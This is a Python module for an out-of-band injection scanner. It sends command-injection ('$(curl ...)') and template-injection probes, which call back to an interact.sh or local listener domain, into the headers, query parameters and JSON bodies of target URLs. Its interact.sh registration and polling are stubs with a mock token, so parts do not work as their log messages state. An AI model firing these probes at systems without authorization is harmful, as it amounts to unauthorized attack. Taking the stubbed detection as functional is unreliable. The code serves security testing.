import asyncio
import httpx
import uuid
import time
from aiohttp import web  # Re-adding aiohttp for the local listener as it's cleaner for this purpose
from utils.logger import logger, log_severity
from utils.output import save_finding

class OOBMonitor:
    def __init__(self, poll_interval=10, dry_run=False, local_mode=False):
        self.poll_interval = poll_interval
        self.dry_run = dry_run
        self.local_mode = local_mode
        self.interact_domain = ""
        self.correlation_id = str(uuid.uuid4())[:8]
        self.token = ""
        self.server_task = None

    async def register_interactsh(self):
        if self.local_mode:
            self.interact_domain = "localhost:8080" # Placeholder for local testing
            logger.info(f"[*] Local listener mode enabled. Domain: {self.interact_domain}")
            return True

        if self.dry_run:
            self.interact_domain = f"{self.correlation_id}.oob.example.com"
            logger.info(f"[DRY RUN] Registered interact.sh subdomain: {self.interact_domain}")
            return True

        # Simplified interact.sh registration for this implementation
        logger.info("[*] Registering with interact.sh...")
        self.interact_domain = f"{self.correlation_id}.oob.interact.sh"
        self.token = "mock-token"
        logger.info(f"[+] Registered interact.sh subdomain: {self.interact_domain}")
        return True

    async def handle_local_request(self, request):
        logger.info(f"[!] Received OOB interaction on local listener from {request.remote}")
        save_finding(3, "HIGH", str(request.url), "OOB Interaction Detected (Local)", {"remote": request.remote})
        return web.Response(text="OK")

    async def start_local_listener(self):
        if self.dry_run:
            logger.info("[DRY RUN] Starting local HTTP listener on port 8080")
            return

        app = web.Application()
        app.router.add_get('/{tail:.*}', self.handle_local_request)
        app.router.add_post('/{tail:.*}', self.handle_local_request)

        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 8080)
        await site.start()
        logger.info("[+] Local HTTP listener started on 0.0.0.0:8080")

    async def poll_interactions(self):
        logger.info(f"[*] Starting OOB polling every {self.poll_interval}s...")
        while True:
            if self.dry_run:
                logger.debug("[DRY RUN] Polling interact.sh for interactions...")
                await asyncio.sleep(self.poll_interval)
                continue

            if self.local_mode:
                # Local listener handles it via callbacks, so we just wait
                await asyncio.sleep(self.poll_interval)
                continue

            # In real use: resp = await httpx.get(f"https://interact.sh/poll?token={self.token}")
            await asyncio.sleep(self.poll_interval)

    def get_payloads(self):
        oob_url = f"http://{self.interact_domain}"
        return [
            oob_url,
            f"$(curl {oob_url})",
            f"<{oob_url}>",
            f"{{{{'{oob_url}'}}}}"
        ]

    async def inject_payloads(self, target_url):
        logger.info(f"[*] Injecting OOB payloads into {target_url}")
        payloads = self.get_payloads()

        headers_to_test = ["X-Forwarded-For", "Referer", "User-Agent", "Host"]

        async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
            for payload in payloads:
                if self.dry_run:
                    logger.debug(f"[DRY RUN] Injecting payload '{payload}' into {target_url}")
                    continue

                for header in headers_to_test:
                    try:
                        await client.get(target_url, headers={header: payload})
                    except Exception:
                        pass

                try:
                    await client.get(target_url, params={"debug": payload, "url": payload})
                except Exception:
                    pass

                try:
                    await client.post(target_url, json={"input": payload, "callback": payload})
                except Exception:
                    pass

    async def run(self, target_urls=None):
        await self.register_interactsh()

        if self.local_mode:
            await self.start_local_listener()

        if target_urls:
            polling_task = asyncio.create_task(self.poll_interactions())
            injection_tasks = [self.inject_payloads(url) for url in target_urls]
            await asyncio.gather(*injection_tasks)

            logger.info("[*] Waiting for potential delayed interactions...")
            await asyncio.sleep(self.poll_interval * 2)
            polling_task.cancel()
        else:
            await self.poll_interactions()

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url")
    parser.add_argument("-f", "--file")
    parser.add_argument("--poll-interval", type=int, default=10)
    parser.add_argument("--local", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args()

    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        with open(args.file, "r") as f:
            urls.extend([line.strip() for line in f if line.strip()])

    monitor = OOBMonitor(poll_interval=args.poll_interval, dry_run=args.dry_run, local_mode=args.local)
    asyncio.run(monitor.run(target_urls=urls))
